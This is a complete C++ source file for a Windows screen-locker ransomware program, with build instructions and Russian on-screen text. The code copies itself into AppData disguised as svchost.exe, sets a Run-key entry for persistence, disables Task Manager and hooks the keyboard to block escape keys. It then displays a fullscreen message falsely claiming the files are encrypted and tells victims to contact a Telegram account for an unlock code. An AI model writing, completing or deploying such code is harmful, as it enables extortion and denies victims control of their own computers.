// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>

#pragma execution_character_set("utf-8")

static const std::wstring kPassword = L"1337";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;
static bool    g_blink     = false;

// Для эффекта печатной машинки
static std::wstring g_full_log = 
    L"Booting Windows...\n"
    L"Boot error: 0x03527737\n"
    L"Boot error: 0x0266712\n"
    L"Boot error: 0x02897593\n"
    L"Boot error: 0x01447812\n"
    L"Boot error: 0x0150974\n"
    L"Boot error: 0x03873700\n"
    L"Boot error: 0x0700882\n"
    L"Boot error: 0x03803618\n"
    L"Memory section at address 0x0424* is locked!\n"
    L"Service UXcryptor started.";
static size_t  g_typed_chars = 0;

// Для анимации глаза
static int g_eye_state = 0; // 0 - открыт, 1 - полуприкрыт, 2 - закрыт
static int g_eye_timer = 0;

static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

static void Unlock() {
    g_locked = false; // Останавливаем звук
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    UnhookWindowsHookEx(g_kbHook);
    DestroyWindow(g_hwnd);
    PostQuitMessage(0);
}

static void DrawEye(HDC dc, int cx, int cy, int state) {
    int ew = 200, eh = 100;
    int left = cx - ew / 2, right = cx + ew / 2;
    int top = cy - eh / 2, bottom = cy + eh / 2;

    HPEN hPen = CreatePen(PS_SOLID, 4, RGB(255, 255, 255));
    SelectObject(dc, hPen);
    SelectObject(dc, GetStockObject(NULL_BRUSH));

    if (state == 2) { // Закрыт
        MoveToEx(dc, left, cy, NULL);
        LineTo(dc, right, cy);
    } else {
        Arc(dc, left, top - 20, right, bottom + 20, left, cy, right, cy);
        Arc(dc, left, top - 20, right, bottom + 20, right, cy, left, cy);
        
        HBRUSH hIris = CreateSolidBrush(RGB(200, 0, 0));
        SelectObject(dc, hIris);
        int irisSize = (state == 1) ? 20 : 60;
        Ellipse(dc, cx - irisSize/2, cy - irisSize/2, cx + irisSize/2, cy + irisSize/2);
        
        HBRUSH hPupil = CreateSolidBrush(RGB(0, 0, 0));
        SelectObject(dc, hPupil);
        int pupilSize = (state == 1) ? 10 : 20;
        Ellipse(dc, cx - pupilSize/2, cy - pupilSize/2, cx + pupilSize/2, cy + pupilSize/2);
        
        DeleteObject(hIris);
        DeleteObject(hPupil);
    }
    DeleteObject(hPen);
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(TRUE); 
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);

        // Таймеры: 1 - печатная машинка, 2 - курсор, 3 - анимация глаза
        SetTimer(h, 1, 50, nullptr); 
        SetTimer(h, 2, 500, nullptr);
        SetTimer(h, 3, 100, nullptr);
        
        // Запуск звукового сопровождения в отдельном потоке
        std::thread([]() {
            while (g_locked) {
                Beep(800, 200);
                Sleep(100);
                Beep(600, 200);
                Sleep(1500);
            }
        }).detach();
        
        return 0;
    }
    case WM_TIMER: {
        if (w == 1) {
            if (g_typed_chars < g_full_log.length()) {
                g_typed_chars += 2; // Скорость печати
                if (g_typed_chars > g_full_log.length()) g_typed_chars = g_full_log.length();
                InvalidateRect(h, nullptr, FALSE);
            }
        } else if (w == 2) {
            g_blink = !g_blink;
            InvalidateRect(h, nullptr, FALSE);
        } else if (w == 3) {
            g_eye_timer++;
            if (g_eye_timer == 40) { g_eye_state = 1; InvalidateRect(h, nullptr, FALSE); }
            else if (g_eye_timer == 45) { g_eye_state = 2; InvalidateRect(h, nullptr, FALSE); }
            else if (g_eye_timer == 50) { g_eye_state = 0; g_eye_timer = 0; InvalidateRect(h, nullptr, FALSE); }
        }
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        int cx = rc.right;
        int cy = rc.bottom;

        // Фон (Красный)
        HBRUSH bg = CreateSolidBrush(RGB(180, 0, 0));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        SetBkMode(dc, TRANSPARENT);

        // Шрифты
        HFONT fLog = CreateFontW(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        HFONT fTitle = CreateFontW(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        HFONT fText = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");

        // Логи загрузки (Печатная машинка)
        SelectObject(dc, fLog);
        SetTextColor(dc, RGB(255, 255, 255));
        std::wstring current_log = g_full_log.substr(0, g_typed_chars);
        RECT rcBoot = {20, 20, cx / 2, 300};
        DrawTextW(dc, current_log.c_str(), -1, &rcBoot, DT_LEFT | DT_TOP);

        // Анимированный глаз и Заголовок
        DrawEye(dc, cx / 2, cy / 2 - 150, g_eye_state);
        
        SelectObject(dc, fTitle);
        RECT rcTitle = {0, cy / 2 - 80, cx, cy / 2 - 20};
        DrawTextW(dc, L"ВАС ЗАМЕТИЛИ", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Блок с рамкой
        int boxW = 800, boxH = 220;
        int boxX = (cx - boxW) / 2;
        int boxY = cy / 2 + 30;
        RECT rcBox = {boxX, boxY, boxX + boxW, boxY + boxH};
        FrameRect(dc, &rcBox, (HBRUSH)GetStockObject(WHITE_BRUSH));

        // Верхняя плашка
        RECT rcBanner = {boxX + 150, boxY - 15, boxX + boxW - 150, boxY + 15};
        FillRect(dc, &rcBanner, (HBRUSH)GetStockObject(WHITE_BRUSH));
        SetTextColor(dc, RGB(180, 0, 0));
        DrawTextW(dc, L"ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!", -1, &rcBanner, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Текст в рамке
        SetTextColor(dc, RGB(255, 255, 255));
        SelectObject(dc, fText);
        RECT rcBoxText = rcBox; rcBoxText.left += 30; rcBoxText.top += 20;
        DrawTextW(dc, L"ПОДОЖДИ!\n\nЧто бы получить код, напиши  @UserTGB  (Telegram)", -1, &rcBoxText, DT_LEFT | DT_TOP);

        // Поле ввода
        RECT rcInputLabel = rcBox; rcInputLabel.left += 30; rcInputLabel.top = boxY + 100;
        DrawTextW(dc, L"введите код разблокировки:", -1, &rcInputLabel, DT_LEFT | DT_TOP);

        RECT rcInput = rcBox; rcInput.left += 30; rcInput.right -= 30; rcInput.top = boxY + 130; rcInput.bottom = boxY + 160;
        HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcInput, white);
        DeleteObject(white);
        
        // Введенный текст
        SetTextColor(dc, RGB(0, 0, 0));
        RECT rcInputText = rcInput; rcInputText.left += 10;
        DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Курсор
        if (g_blink) {
            SIZE sz;
            GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 4, rcInputText.bottom - 5};
            HBRUSH curBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(dc, &rcCursor, curBrush);
            DeleteObject(curBrush);
        }

        // Нижний текст
        SetTextColor(dc, RGB(255, 255, 255));
        RECT rcBottom = rcBox; rcBottom.top = rcBox.bottom + 10;
        DrawTextW(dc, L"Current PC: 1337-ABCD-EFGH-01", -1, &rcBottom, DT_LEFT | DT_TOP);
        DrawTextW(dc, L"Enter [Ввод]", -1, &rcBottom, DT_RIGHT | DT_TOP);

        DeleteObject(fLog);
        DeleteObject(fTitle);
        DeleteObject(fText);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) {
            g_input.pop_back();
        } else if (w >= 32 && w < 127 && g_input.length() < 15) {
            g_input.push_back((wchar_t)w);
        }
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            if (g_input == kPassword) {
                Unlock();
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
